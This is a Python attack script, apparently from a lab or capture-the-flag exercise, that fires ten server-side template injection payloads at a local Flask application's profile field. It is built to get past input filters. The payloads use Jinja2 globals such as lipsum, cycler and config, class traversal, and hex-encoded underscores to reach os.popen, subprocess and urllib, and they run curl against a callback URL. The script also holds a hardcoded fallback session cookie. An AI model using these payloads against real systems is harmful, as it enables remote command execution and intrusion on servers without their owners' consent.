#!/usr/bin/env python3
import requests
import urllib.parse
import time

base_url = "http://127.0.0.1:32813"
callback_url = "http://localhost:8888/callback"

print("=== Starting SSTI Filter Bypass Test ===")
print(f"Target: {base_url}")
print(f"Callback endpoint: {callback_url}")
print()

# Step 1: Authenticate
login_data = {"username": "test", "password": "test"}
login_url = base_url + "/login"

print(f"[+] Authenticating at {login_url}")
try:
    login_response = requests.post(login_url, data=login_data, allow_redirects=False)
    print(f"Login status: {login_response.status_code}")
    
    if "session" in login_response.cookies:
        session_cookie = login_response.cookies["session"]
        print(f"[+] Session cookie obtained: {session_cookie}")
    else:
        print("[!] Session cookie not obtained")
        print(f"Login response headers: {dict(login_response.headers)}")
        print(f"Login response cookies: {dict(login_response.cookies)}")
        session_cookie = None
        
except Exception as e:
    print(f"[!] Login error: {e}")
    session_cookie = None

if not session_cookie:
    # Use the provided session cookie as fallback
    session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"
    print(f"[*] Using fallback session cookie: {session_cookie}")

cookies = {"session": session_cookie}

# Step 2: Test different URL-encoded SSTI payloads
def test_payload(payload_name, raw_payload, description=""):
    print(f"\n{'='*70}")
    print(f"Test: {payload_name}")
    if description:
        print(f"Description: {description}")
    print(f"Raw payload: {raw_payload}")
    
    # URL encode the payload
    encoded_payload = urllib.parse.quote(raw_payload)
    print(f"URL encoded: {encoded_payload}")
    
    # Send POST request to profile
    profile_url = base_url + "/profile"
    data = {"bio": encoded_payload}
    
    try:
        response = requests.post(profile_url, data=data, cookies=cookies, allow_redirects=False)
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}B")
        
        if response.status_code == 200:
            print("[+] SUCCESS: Payload bypassed filter!")
        elif response.status_code == 400:
            print("[-] BLOCKED: 400 Bad Request (filter triggered)")
        elif response.status_code == 403:
            print("[-] BLOCKED: 403 Forbidden")
        elif response.status_code == 500:
            print("[!] SERVER ERROR: 500 Internal Server Error (may indicate partial execution)")
        
        if response.text:
            print(f"Response preview: {response.text[:200]}")
            
        return response.status_code
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

print(f"\n{'='*70}")
print("TESTING SSTI PAYLOADS WITH URL ENCODING")
print(f"{'='*70}")

# Payload 1: Basic urllib.request callback (urlencoded)
payload1 = '{{ urllib.request.urlopen("' + callback_url + '").read() }}'
result1 = test_payload("Basic urllib.request", payload1, "Basic payload using urllib.request.urlopen()")

# Payload 2: Using lipsum.__globals__ to access urllib
payload2 = '{{ lipsum.__globals__["urllib"].request.urlopen("' + callback_url + '").read() }}'
result2 = test_payload("lipsum.__globals__ urllib", payload2, "Using lipsum object to access urllib")

# Payload 3: Using config.__class__ to access urllib
payload3 = '{{ config.__class__.__init__.__globals__["urllib"].request.urlopen("' + callback_url + '").read() }}'
result3 = test_payload("config.__class__ urllib", payload3, "Using config object to access urllib")

# Payload 4: Using os.popen with curl
payload4 = '{{ os.popen("curl ' + callback_url + '").read() }}'
result4 = test_payload("os.popen curl", payload4, "Using os.popen() to execute curl")

# Payload 5: Using cycler.__globals__ to access os
payload5 = '{{ cycler.__init__.__globals__["os"].popen("curl ' + callback_url + '").read() }}'
result5 = test_payload("cycler.__init__ os.popen", payload5, "Using cycler object to access os.popen()")

# Payload 6: Using request.args to bypass underscores (if blocked)
payload6 = '{{ "".class.mro()[2].subclasses()[X]["import"]("urllib").request.urlopen("' + callback_url + '").read() }}'
result6 = test_payload("Class traversal import", payload6, "Using class traversal with import")

# Payload 7: Hex-encoded underscores (bypass underscore filter)
payload7 = '{{ ""|attr("\x5f\x5fclass\x5f\x5f") }}'
result7 = test_payload("Hex encoded underscores", payload7, "Testing hex-encoded underscores")

# Payload 8: Multiple encoding levels (double URL encoding)
# First encode as %7B%7B%20urllib.request...%20%7D%7D then double encode
raw_payload8 = '{{ urllib.request.urlopen("' + callback_url + '").read() }}'
double_encoded = urllib.parse.quote(urllib.parse.quote(raw_payload8))
print(f"\n{'='*70}")
print(f"Test: Double URL encoded payload")
print(f"Double encoded: {double_encoded}")
print("NOTE: Manual testing needed for double encoding")

# Payload 9: Using subprocess.Popen
payload9 = '{{ subprocess.Popen(["curl", "' + callback_url + '"], stdout=-1).communicate() }}'
result9 = test_payload("subprocess.Popen curl", payload9, "Using subprocess.Popen to execute curl")

# Payload 10: Using get_flashed_messages (Flask specific)
payload10 = '{{ get_flashed_messages.__globals__["urllib"].request.urlopen("' + callback_url + '").read() }}'
result10 = test_payload("get_flashed_messages urllib", payload10, "Using Flask's get_flashed_messages")

# Summary
print(f"\n{'='*70}")
print("SUMMARY OF RESULTS")
print(f"{'='*70}")

results = {
    "Basic urllib.request": result1,
    "lipsum.__globals__ urllib": result2,
    "config.__class__ urllib": result3,
    "os.popen curl": result4,
    "cycler.__init__ os.popen": result5,
    "Class traversal import": result6,
    "Hex encoded underscores": result7,
    "subprocess.Popen curl": result9,
    "get_flashed_messages urllib": result10
}

successful = []
for name, code in results.items():
    if code == 200:
        successful.append(name)
    print(f"{name}: {code}")

if successful:
    print(f"\n[+] SUCCESS: {len(successful)} payload(s) bypassed the filter:")
    for s in successful:
        print(f"  - {s}")
else:
    print(f"\n[-] No payload bypassed the filter")

print(f"\n{'='*70}")
print("If any callbacks were triggered, they should appear at:")
print(f"  http://localhost:8888/callback")
print(f"Use separate monitoring to verify callbacks.")
print(f"{'='*70}")
